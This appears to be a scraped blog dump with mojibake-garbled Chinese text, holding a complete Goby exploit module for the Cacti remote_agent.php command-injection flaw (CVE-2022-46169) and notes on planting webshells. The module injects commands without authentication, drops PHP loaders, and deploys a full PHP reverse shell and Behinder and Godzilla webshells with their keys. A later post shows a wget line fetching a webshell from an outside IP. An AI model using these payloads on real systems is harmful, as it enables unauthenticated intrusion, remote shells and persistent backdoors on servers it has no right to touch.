æƒ³è¦æŠŠä»¥ä¸‹çš„å†…å®¹ï¼Œé€šè¿‡ php ä»£ç å†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”POST æ˜¯å˜é‡ï¼Œéœ€è¦ä¼ å‚æ•°è¿›å»ã€‚ 1&lt;?php file_put_contents($_POST[1],$_POST[2];?&gt; 1file_put_contents(&quot;hello.txt&quot;,&#x27;&lt;?php file_put_contents($_POST[1],$_POST[2];?&gt;&#x27;); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413package exploitsimport ( &quot;encoding/base64&quot; &quot;errors&quot; &quot;git.gobies.org/goby/goscanner/godclient&quot; &quot;git.gobies.org/goby/goscanner/goutils&quot; &quot;git.gobies.org/goby/goscanner/jsonvul&quot; &quot;git.gobies.org/goby/goscanner/scanconfig&quot; &quot;git.gobies.org/goby/httpclient&quot; &quot;net/url&quot; &quot;strings&quot; &quot;time&quot;)func init() &#123; expJson := `&#123; &quot;Name&quot;: &quot;Cacti monitoring system remote_agent.php command execution vulnerability (CVE-2022-46169)&quot;, &quot;Description&quot;: &quot;&lt;p&gt;Cacti is an open source platform that provides users with a powerful and scalable operational monitoring and fault management framework.&lt;/p&gt;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;/p&gt;&quot;, &quot;Product&quot;: &quot;Cacti-Monitoring&quot;, &quot;Homepage&quot;: &quot;https://www.cacti.net/&quot;, &quot;DisclosureDate&quot;: &quot;2022-12-05&quot;, &quot;Author&quot;: &quot;Gryffinbit@gmail.com&quot;, &quot;FofaQuery&quot;: &quot;header=\\&quot;Set-Cookie: cacti=\\&quot; || title=\\&quot;Login to Cacti\\&quot; || body=\\&quot;/plugins/jqueryskin/include/login.css\\&quot; || header=\\&quot;Cacti Access\\&quot; || banner=\\&quot;Set-Cookie: cacti=\\&quot; || banner=\\&quot;Cacti Access\\&quot;&quot;, &quot;GobyQuery&quot;: &quot;header=\\&quot;Set-Cookie: cacti=\\&quot; || title=\\&quot;Login to Cacti\\&quot; || body=\\&quot;/plugins/jqueryskin/include/login.css\\&quot; || header=\\&quot;Cacti Access\\&quot; || banner=\\&quot;Set-Cookie: cacti=\\&quot; || banner=\\&quot;Cacti Access\\&quot;&quot;, &quot;Level&quot;: &quot;3&quot;, &quot;Impact&quot;: &quot;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;br&gt;&lt;br&gt;&lt;/p&gt;&quot;, &quot;Recommendation&quot;: &quot;&lt;p&gt;1. The manufacturer has released a vulnerability fix, please pay attention to updates in time: &lt;a href=\\&quot;https://www.cacti.net/\\&quot; rel=\\&quot;nofollow\\&quot;&gt;https://www.cacti.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2. Set access policies through security devices such as firewalls and set whitelist access.&lt;/p&gt;&lt;p&gt;3. Unless necessary, it is prohibited to access the system from the public network.&lt;/p&gt;&quot;, &quot;References&quot;: [], &quot;Is0day&quot;: false, &quot;HasExp&quot;: true, &quot;ExpParams&quot;: [ &#123; &quot;name&quot;: &quot;attackType&quot;, &quot;type&quot;: &quot;select&quot;, &quot;value&quot;: &quot;cmd,reverse,webshell&quot;, &quot;show&quot;: &quot;&quot; &#125;, &#123; &quot;name&quot;: &quot;cmd&quot;, &quot;type&quot;: &quot;input&quot;, &quot;value&quot;: &quot;whoami&quot;, &quot;show&quot;: &quot;attackType=cmd&quot; &#125;, &#123; &quot;name&quot;: &quot;webshell&quot;, &quot;type&quot;: &quot;select&quot;, &quot;value&quot;: &quot;behinder,godzilla,custom&quot;, &quot;show&quot;: &quot;attackType=webshell&quot; &#125;, &#123; &quot;name&quot;: &quot;filename&quot;, &quot;type&quot;: &quot;input&quot;, &quot;value&quot;: &quot;hello.php&quot;, &quot;show&quot;: &quot;attackType=webshell,webshell=custom&quot; &#125;, &#123; &quot;name&quot;: &quot;content&quot;, &quot;type&quot;: &quot;input&quot;, &quot;value&quot;: &quot;&lt;?php phpinfo(); ?&gt;&quot;, &quot;show&quot;: &quot;attackType=webshell,webshell=custom&quot; &#125; ], &quot;ExpTips&quot;: &#123; &quot;Type&quot;: &quot;&quot;, &quot;Content&quot;: &quot;&quot; &#125;, &quot;ScanSteps&quot;: [ &quot;AND&quot;, &#123; &quot;Request&quot;: &#123; &quot;method&quot;: &quot;GET&quot;, &quot;uri&quot;: &quot;&quot;, &quot;follow_redirect&quot;: true, &quot;header&quot;: &#123;&#125;, &quot;data_type&quot;: &quot;text&quot;, &quot;data&quot;: &quot;&quot; &#125;, &quot;ResponseTest&quot;: &#123; &quot;type&quot;: &quot;group&quot;, &quot;operation&quot;: &quot;AND&quot;, &quot;checks&quot;: [ &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$code&quot;, &quot;operation&quot;: &quot;==&quot;, &quot;value&quot;: &quot;200&quot;, &quot;bz&quot;: &quot;&quot; &#125;, &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$body&quot;, &quot;operation&quot;: &quot;contains&quot;, &quot;value&quot;: &quot;test&quot;, &quot;bz&quot;: &quot;&quot; &#125; ] &#125;, &quot;SetVariable&quot;: [] &#125; ], &quot;ExploitSteps&quot;: [ &quot;AND&quot;, &#123; &quot;Request&quot;: &#123; &quot;method&quot;: &quot;GET&quot;, &quot;uri&quot;: &quot;/test.php&quot;, &quot;follow_redirect&quot;: true, &quot;header&quot;: &#123;&#125;, &quot;data_type&quot;: &quot;text&quot;, &quot;data&quot;: &quot;&quot; &#125;, &quot;ResponseTest&quot;: &#123; &quot;type&quot;: &quot;group&quot;, &quot;operation&quot;: &quot;AND&quot;, &quot;checks&quot;: [ &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$code&quot;, &quot;operation&quot;: &quot;==&quot;, &quot;value&quot;: &quot;200&quot;, &quot;bz&quot;: &quot;&quot; &#125;, &#123; &quot;type&quot;: &quot;item&quot;, &quot;variable&quot;: &quot;$body&quot;, &quot;operation&quot;: &quot;contains&quot;, &quot;value&quot;: &quot;test&quot;, &quot;bz&quot;: &quot;&quot; &#125; ] &#125;, &quot;SetVariable&quot;: [] &#125; ], &quot;Tags&quot;: [ &quot;Command Execution&quot; ], &quot;VulType&quot;: [ &quot;Command Execution&quot; ], &quot;CVEIDs&quot;: [ &quot;CVE-2022-46169&quot; ], &quot;CNNVD&quot;: [ &quot;CNNVD-202212-2342&quot; ], &quot;CNVD&quot;: [ &quot;&quot; ], &quot;CVSSScore&quot;: &quot;9.8&quot;, &quot;Translation&quot;: &#123; &quot;CN&quot;: &#123; &quot;Name&quot;: &quot;Cacti ç›‘æ§ç³»ç»Ÿ remote_agent.php å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-46169ï¼‰&quot;, &quot;Product&quot;: &quot;Cacti-ç›‘æ§ç³»ç»Ÿ&quot;, &quot;Description&quot;: &quot;&lt;p&gt;Cacti æ˜¯ä¸€ä¸ªå¼€æºå¹³å°ï¼Œå¯ä¸ºç”¨æˆ·æä¾›å¼ºå¤§ä¸”å¯æ‰©å±•çš„æ“ä½œç›‘æ§å’Œæ•…éšœç®¡ç†æ¡†æ¶ã€‚&lt;/p&gt;&lt;p&gt;å°äº1.22ç‰ˆæœ¬ä¸­çš„remote_agent.phpæ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®æ­¤æ–‡ä»¶ã€‚æ”»å‡»è€…å¯åˆ©ç”¨get_nfilter_request_var()å‡½æ•°æ£€ç´¢çš„å‚æ•°$poller_idï¼Œæ¥æ»¡è¶³poller_item =POLLER_ACTION_SCRIPT_PHPæ¡ä»¶ï¼Œè§¦å‘proc_open()å‡½æ•°ï¼Œä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨æˆåŠŸåï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åœ¨è¿è¡Œ Cacti çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚&lt;br&gt;&lt;br&gt;&lt;/p&gt;&quot;, &quot;Recommendation&quot;: &quot;&lt;p&gt;1ã€å‚å•†å·²å‘å¸ƒäº†æ¼æ´ä¿®å¤ç¨‹åºï¼Œè¯·åŠæ—¶å…³æ³¨æ›´æ–°ï¼š&lt;a href=\\&quot;https://www.cacti.net/\\&quot; rel=\\&quot;nofollow\\&quot;&gt;https://www.cacti.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2ã€é€šè¿‡é˜²ç«å¢™ç­‰å®‰å…¨è®¾å¤‡è®¾ç½®è®¿é—®ç­–ç•¥ï¼Œè®¾ç½®ç™½åå•è®¿é—®ã€‚&lt;/p&gt;&lt;p&gt;3ã€å¦‚éå¿…è¦ï¼Œç¦æ­¢å…¬ç½‘è®¿é—®è¯¥ç³»ç»Ÿã€‚&lt;/p&gt;&quot;, &quot;Impact&quot;: &quot;&lt;p&gt;å°äº1.22ç‰ˆæœ¬ä¸­çš„remote_agent.phpæ–‡ä»¶ä¸­ï¼Œæ”»å‡»è€…æ— éœ€èº«ä»½éªŒè¯å³å¯è®¿é—®æ­¤æ–‡ä»¶ã€‚æ”»å‡»è€…å¯åˆ©ç”¨get_nfilter_request_var()å‡½æ•°æ£€ç´¢çš„å‚æ•°$poller_idï¼Œæ¥æ»¡è¶³poller_item =POLLER_ACTION_SCRIPT_PHPæ¡ä»¶ï¼Œè§¦å‘proc_open()å‡½æ•°ï¼Œä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚æ¼æ´åˆ©ç”¨æˆåŠŸåï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åœ¨è¿è¡Œ Cacti çš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚&lt;br&gt;&lt;/p&gt;&quot;, &quot;VulType&quot;: [ &quot;å‘½ä»¤æ‰§è¡Œ&quot; ], &quot;Tags&quot;: [ &quot;å‘½ä»¤æ‰§è¡Œ&quot; ] &#125;, &quot;EN&quot;: &#123; &quot;Name&quot;: &quot;Cacti monitoring system remote_agent.php command execution vulnerability (CVE-2022-46169)&quot;, &quot;Product&quot;: &quot;Cacti-Monitoring&quot;, &quot;Description&quot;: &quot;&lt;p&gt;Cacti is an open source platform that provides users with a powerful and scalable operational monitoring and fault management framework.&lt;/p&gt;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;/p&gt;&quot;, &quot;Recommendation&quot;: &quot;&lt;p&gt;1. The manufacturer has released a vulnerability fix, please pay attention to updates in time: &lt;a href=\\&quot;https://www.cacti.net/\\&quot; rel=\\&quot;nofollow\\&quot;&gt;https://www.cacti.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;2. Set access policies through security devices such as firewalls and set whitelist access.&lt;/p&gt;&lt;p&gt;3. Unless necessary, it is prohibited to access the system from the public network.&lt;/p&gt;&quot;, &quot;Impact&quot;: &quot;&lt;p&gt;The remote_agent.php file in versions less than 1.22 allows an attacker to access this file without authentication. An attacker can use the parameter $poller_id retrieved by the get_nfilter_request_var() function to satisfy the poller_item =POLLER_ACTION_SCRIPT_PHP condition and trigger the proc_open() function, resulting in command execution. A successful exploit could allow an unauthenticated attacker to execute arbitrary code on a server running Cacti.&lt;br&gt;&lt;br&gt;&lt;/p&gt;&quot;, &quot;VulType&quot;: [ &quot;Command Execution&quot; ], &quot;Tags&quot;: [ &quot;Command Execution&quot; ] &#125; &#125;, &quot;AttackSurfaces&quot;: &#123; &quot;Application&quot;: null, &quot;Support&quot;: null, &quot;Service&quot;: null, &quot;System&quot;: null, &quot;Hardware&quot;: null &#125;, &quot;PostTime&quot;: &quot;2024-01-17&quot;&#125;` filename := goutils.RandomHexString(5) + &quot;.php&quot; base64Encode8dhYGFhsgbbhR := func(input string) string &#123; inputBytes := []byte(input) encodedString := base64.StdEncoding.EncodeToString(inputBytes) return encodedString &#125; sendPayload8dhYGFhsgbbhR := func(hostInfo *httpclient.FixUrl, payload string) (*httpclient.HttpResponse, error) &#123; payloadConfig := httpclient.NewGetRequestConfig(&quot;/remote_agent.php?action=polldata&amp;local_data_ids[0]=6&amp;host_id=1&amp;poller_id=%7c%20&quot; + url.QueryEscape(payload)) payloadConfig.VerifyTls = false payloadConfig.FollowRedirect = false // å†™é©¬è¿›å»çš„è¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰å“åº”ç»“æœï¼Œä¼šæœ‰ä¸€ä¸ªé»˜è®¤ç­‰å¾…æ—¶é—´ï¼Œä¿®æ”¹é‚£ä¸ªæ—¶é—´ã€‚ç¼©çŸ­ä¸€ç‚¹ payloadConfig.Timeout = 2 payloadConfig.Header.Store(&quot;X-Forwarded-For&quot;, &quot;127.0.0.1&quot;) return httpclient.DoHttpRequest(hostInfo, payloadConfig) &#125; uploadFile8dhYGFhsgbbhR := func(hostInfo *httpclient.FixUrl, content, param string) (*httpclient.HttpResponse, error) &#123; // &lt;?php system(base64_decode($_GET[1]));?&gt; å•å¼•å·ä¼šè¢«åƒï¼Œå¹¶ä¸”éœ€è¦ç”¨getçš„è¯·æ±‚æ–¹å¼ checkFileConfig := httpclient.NewGetRequestConfig(&quot;/&quot; + filename) checkFileConfig.VerifyTls = false checkFileConfig.FollowRedirect = false // æ£€æŸ¥å°é©¬æ˜¯å¦å­˜åœ¨ï¼Œä¸å­˜åœ¨å°±åˆ›å»º if resp, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); resp == nil &amp;&amp; err != nil &#123; return nil, err &#125; else if resp != nil &amp;&amp; resp.StatusCode != 200 &#123; // å†™é©¬è¿›å»çš„è¿‡ç¨‹ä¸­ï¼Œæ²¡æœ‰å“åº”ç»“æœ sendPayload8dhYGFhsgbbhR(hostInfo, content) // æ–‡ä»¶ä¸å­˜åœ¨ï¼Œé‡æ–°æ£€æŸ¥æ–‡ä»¶æ˜¯å¦è¢«åˆ›å»ºæˆåŠŸ if check, err := httpclient.DoHttpRequest(hostInfo, checkFileConfig); check == nil &amp;&amp; err != nil &#123; return nil, err &#125; else if check != nil &amp;&amp; check.StatusCode != 200 &#123; return nil, errors.New(&quot;åˆ›å»ºæ–‡ä»¶å¤±è´¥&quot;) &#125; &#125; // æ–‡ä»¶å­˜åœ¨ï¼Œç›´æ¥å‘é€ checkRequestConfig := httpclient.NewGetRequestConfig(&quot;/&quot; + filename + param) checkRequestConfig.VerifyTls = false checkRequestConfig.FollowRedirect = false return httpclient.DoHttpRequest(hostInfo, checkRequestConfig) &#125; checkFile8dhYGFhsgbbhR := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) &#123; checkFileConfig := httpclient.NewGetRequestConfig(&quot;/&quot; + uri) checkFileConfig.VerifyTls = false checkFileConfig.FollowRedirect = false return httpclient.DoHttpRequest(hostInfo, checkFileConfig) &#125; ExpManager.AddExploit(NewExploit( goutils.GetFileName(), expJson, func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool &#123; checkStr := goutils.RandomHexString(8) resp, _ := uploadFile8dhYGFhsgbbhR(hostInfo, `echo &#x27;&lt;?php system(base64_decode($_GET[1]));?&gt;&#x27; &gt; `+filename, `?1=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(&quot;echo &quot;+checkStr))) return resp != nil &amp;&amp; resp.StatusCode == 200 &amp;&amp; strings.Contains(resp.Utf8Html, checkStr) &#125;, func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult &#123; attackType := goutils.B2S(ss.Params[&quot;attackType&quot;]) if attackType == &quot;cmd&quot; &#123; filename = goutils.RandomHexString(5) + &quot;.php&quot; cmd := goutils.B2S(ss.Params[&quot;cmd&quot;]) if resp, err := uploadFile8dhYGFhsgbbhR(expResult.HostInfo, `echo &#x27;&lt;?php system(base64_decode($_GET[1]));?&gt;&#x27; &gt; `+filename, `?1=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(cmd))); resp != nil &amp;&amp; resp.StatusCode == 200 &#123; expResult.Success = true expResult.Output = resp.Utf8Html &#125; else if err != nil &#123; expResult.Output = err.Error() &#125; else &#123; expResult.Output = `æ¼æ´åˆ©ç”¨å¤±è´¥` &#125; &#125; else if attackType == &quot;reverse&quot; &#123; filename = goutils.RandomHexString(5) + &quot;.php&quot; reverseFilename := goutils.RandomHexString(5) + &quot;.php&quot; waitSessionCh := make(chan string) rp, err := godclient.WaitSession(&quot;reverse_linux_none&quot;, waitSessionCh) if err != nil &#123; expResult.Output = &quot;æ— å¯ç”¨åå¼¹ç«¯å£&quot; return expResult &#125; addr := godclient.GetGodServerHost() reverseCode := `&lt;?phpset_time_limit (0);$VERSION = &quot;1.0&quot;;$ip = &#x27;` + addr + `&#x27;; $port = ` + rp + `; $chunk_size = 1400;$write_a = null;$error_a = null;$shell = &#x27;uname -a; w; id; /bin/sh -i&#x27;;$daemon = 0;$debug = 0;if (function_exists(&#x27;pcntl_fork&#x27;)) &#123; $pid = pcntl_fork(); if ($pid == -1) &#123; printit(&quot;ERROR: Can&#x27;t fork&quot;); exit(1); &#125; if ($pid) &#123; exit(0); // Parent exits &#125; if (posix_setsid() == -1) &#123; printit(&quot;Error: Can&#x27;t setsid()&quot;); exit(1); &#125; $daemon = 1;&#125; else &#123; printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;);&#125;chdir(&quot;/&quot;);umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if (!$sock) &#123; printit(&quot;$errstr ($errno)&quot;); exit(1);&#125;$descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;) );$process = proc_open($shell, $descriptorspec, $pipes);if (!is_resource($process)) &#123; printit(&quot;ERROR: Can&#x27;t spawn shell&quot;); exit(1);&#125;stream_set_blocking($pipes[0], 0);stream_set_blocking($pipes[1], 0);stream_set_blocking($pipes[2], 0);stream_set_blocking($sock, 0);printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);while (1) &#123; if (feof($sock)) &#123; printit(&quot;ERROR: Shell connection terminated&quot;); break; &#125; if (feof($pipes[1])) &#123; printit(&quot;ERROR: Shell process terminated&quot;); break; &#125; $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) &#123; if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); &#125; if (in_array($pipes[1], $read_a)) &#123; if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); &#125; if (in_array($pipes[2], $read_a)) &#123; if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); &#125;&#125;fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);function printit ($string) &#123; if (!$daemon) &#123; print &quot;$string\\n&quot;; &#125;&#125;?&gt; ` uploadFile8dhYGFhsgbbhR(expResult.HostInfo, `echo &#x27;&lt;?php $file = $_GET[1];$content = $_GET[2];file_put_contents($file, base64_decode($content));?&gt;&#x27; &gt; `+filename, `?1=`+reverseFilename+`&amp;2=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(reverseCode))) checkFile8dhYGFhsgbbhR(expResult.HostInfo, reverseFilename) select &#123; case webConsoleID := &lt;-waitSessionCh: if u, err := url.Parse(webConsoleID); err == nil &#123; expResult.Success = true expResult.OutputType = &quot;html&quot; sid := strings.Join(u.Query()[&quot;id&quot;], &quot;&quot;) expResult.Output = `&lt;br/&gt;&lt;a href=&quot;goby://sessions/view?sid=` + sid + `&amp;key=` + godclient.GetKey() + `&quot;&gt;open shell&lt;/a&gt;` &#125; case &lt;-time.After(time.Second * 20): expResult.Success = false expResult.Output = &quot;æ¼æ´åˆ©ç”¨å¤±è´¥&quot; &#125; &#125; else if attackType == &quot;webshell&quot; &#123; var content string webshell := goutils.B2S(ss.Params[&quot;webshell&quot;]) filename = goutils.RandomHexString(8) + &quot;.php&quot; webshellFilename := goutils.RandomHexString(5) + &quot;.php&quot; if webshell == &quot;behinder&quot; &#123; /*è¯¥å¯†é’¥ä¸ºè¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç rebeyond*/ content = `&lt;?php @error_reporting(0);session_start();$key=&quot;e45e329feb5d925b&quot;;$_SESSION[&quot;k&quot;]=$key;session_write_close();$post=file_get_contents(&quot;php://input&quot;);if(!extension_loaded(&quot;openssl&quot;))&#123;$t=&quot;base64_&quot;.&quot;decode&quot;;$post=$t($post.&quot;&quot;);for($i=0;$i&lt;strlen($post);$i++)&#123;$post[$i]=$post[$i]^$key[$i+1&amp;15];&#125;&#125;else&#123;$post=openssl_decrypt($post,&quot;AES128&quot;,$key);&#125;$arr=explode(&quot;|&quot;,$post);$func=$arr[0];$params=$arr[1];class C&#123;public function __invoke($p)&#123;eval($p.&quot;&quot;);&#125;&#125;@call_user_func(new C(),$params);?&gt;` &#125; else if webshell == &quot;godzilla&quot; &#123; // å“¥æ–¯æ‹‰ pass key content = `&lt;?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K)&#123; for($i=0;$i&lt;strlen($D);$i++) &#123; $c = $K[$i+1&amp;15]; $D[$i] = $D[$i]^$c; &#125; return $D; &#125; $pass=&quot;pass&quot;; $payloadName=&quot;payload&quot;; $key=&quot;3c6e0b8a9c15224a&quot;; if (isset($_POST[$pass]))&#123; $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName]))&#123; $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123; $payload=encode($payload,$key); &#125; eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); &#125;else&#123; if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123; $_SESSION[$payloadName]=encode($data,$key);&#125;&#125;&#125;?&gt;` &#125; else &#123; content = goutils.B2S(ss.Params[&quot;content&quot;]) webshellFilename = goutils.B2S(ss.Params[&quot;filename&quot;]) &#125; if resp, err := uploadFile8dhYGFhsgbbhR(expResult.HostInfo, `echo &#x27;&lt;?php $file = $_GET[1];$content = $_GET[2];file_put_contents($file, base64_decode($content));?&gt;&#x27; &gt; `+filename, `?1=`+webshellFilename+`&amp;2=`+url.QueryEscape(base64Encode8dhYGFhsgbbhR(content))); resp != nil &amp;&amp; (resp.StatusCode == 200 || resp.StatusCode == 500) &#123; expResult.Success = true expResult.Output = &quot;WebShell URL: &quot; + expResult.HostInfo.FixedHostInfo + &quot;/&quot; + webshellFilename + &quot;\\n&quot; if webshell == &quot;behinder&quot; &#123; expResult.Output += &quot;Password: rebeyond\\n&quot; expResult.Output += &quot;WebShell tool: Behinder v3.0\\n&quot; &#125; else if webshell == &quot;godzilla&quot; &#123; expResult.Output += &quot;Password: pass åŠ å¯†å™¨ï¼šPHP_XOR_BASE64\\n&quot; expResult.Output += &quot;WebShell tool: Godzilla v4.1\\n&quot; &#125; expResult.Output += &quot;Webshell type: php&quot; &#125; else if err != nil &#123; expResult.Output = err.Error() &#125; else &#123; expResult.Output = `æ¼æ´åˆ©ç”¨å¤±è´¥` &#125; &#125; else &#123; expResult.Output = `æœªçŸ¥çš„åˆ©ç”¨æ–¹å¼` &#125; return expResult &#125;, ))&#125;","categories":[{"name":"å†™ exp é‡åˆ°çš„é—®é¢˜","slug":"å†™-exp-é‡åˆ°çš„é—®é¢˜","permalink":"https://gryffinbit.top/categories/%E5%86%99-exp-%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://gryffinbit.top/tags/PHP/"}],"author":"Gryffinbit"},{"title":"å†™expæ—¶é‡åˆ°çš„é—®é¢˜ï¼ˆæ™®éç‰ˆï¼‰","slug":"å†™expæ—¶é‡åˆ°çš„é—®é¢˜","date":"2023-10-19T19:06:37.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2023/10/20/å†™expæ—¶é‡åˆ°çš„é—®é¢˜/","permalink":"https://gryffinbit.top/2023/10/20/%E5%86%99exp%E6%97%B6%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"","text":"å¼•å·è¢«è¿‡æ»¤ä»Šå¤©å‘½ä»¤æ‰§è¡Œï¼Œæƒ³è¦ä¸Šä¼ é©¬ï¼Œé‡åˆ°äº†å¼•å·è¢«è¿‡æ»¤æ‰çš„é—®é¢˜ã€‚æœ€ç»ˆæ‰¾åˆ°äº†ä¸‰ç§æ–¹å¼æ¥è§£å†³ã€‚ ç”¨echo -e å¯¹å®ƒ16è¿›åˆ¶ç¼–ç  1echo -e &quot;\\x22hello\\x22&quot; &gt;&gt; a.asp å› ä¸ºå®ƒæœ¬èº«çš„aspé‡Œé¢æœ‰å¼•å·ï¼Œæˆ‘é€šè¿‡å®ƒä»…æœ‰çš„å‘½ä»¤headå’Œcutï¼ŒæŠŠå®ƒæ‘˜åˆ°äº†æˆ‘çš„ä¸Šä¼ æ–‡ä»¶ä¸­ 1head -n 1 home.asp | cut -c 23 &gt;&gt; a.asp å› ä¸ºæœ‰ä¸ªåˆ«çš„æ¡ˆä¾‹ï¼Œå®ƒæœ‰wgetå‘½ä»¤ï¼Œæˆ‘å°±ç”¨å®ƒä¸‹è½½åŒ¿åæœåŠ¡å™¨é‡Œçš„aspé©¬è¿›å»äº†ã€‚ 1wget http://5.188.230.77/ps/shell.asp ä¸çŸ¥é“ WEB è·¯å¾„åœ¨å“ªé‡Œè¿˜é‡åˆ°ä¸€äº›å°é—®é¢˜ã€‚æ¯”å¦‚ä¸çŸ¥é“webçš„è·¯å¾„åœ¨å“ªé‡Œï¼Œå¦‚æœå¯ä»¥å‘½ä»¤æ‰§è¡Œçš„è¯ï¼Œå°±findè®¿é—®çš„é¦–é¡µã€‚ 1find / -name home.asp è¿™ä¸ªè¿”å›è·¯å¾„ï¼Œå°±æ˜¯webçš„æ–‡ä»¶è·¯å¾„äº†ã€‚å†™å…¥çš„æ—¶å€™ï¼Œå†™è¿›å»è¿™ä¸ªwebè·¯å¾„ï¼Œä½†æ˜¯GETè®¿é—®çš„æ—¶å€™ï¼Œç›´æ¥æ ¹ç›®å½•çš„å»è®¿é—®å®ƒã€‚ï¼ˆå› ä¸ºç›¸å¯¹è·¯å¾„çš„è®¾ç½®åŸå› ï¼‰ä¹Ÿä¸ä¸€å®šæ˜¯æ ¹ç›®å½•ï¼Œä»å‘½ä»¤æ‰§è¡Œçš„æ¼æ´ç‚¹è¿›å»ä¹‹åï¼Œçœ‹è‡ªå·±çš„å½“å‰è·¯å¾„ã€‚å½“å‰è·¯å¾„åœ¨å“ªé‡Œï¼Œgetå°±è®¿é—®å“ªé‡Œ echo ç”¨æ³•é—®é¢˜å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œä¸ºäº†é¿å…æ¢è¡Œï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼å†™å…¥ 1echo -n &quot;hello&quot;&gt;a.txt è¿½åŠ å†™å…¥ 1echo -n &quot;hello&quot;&gt;&gt;a.txt æ‰¾ç»å¯¹è·¯å¾„windows å¯ä»¥æŒ¨ä¸ªæ¢ç›˜ç¬¦ï¼Œå®ç°å…¨å±€æœç´¢çš„ç›®çš„ 12dir D:\\*url.md* /s /bdir D:\\*2023-10-25 /s /b POC 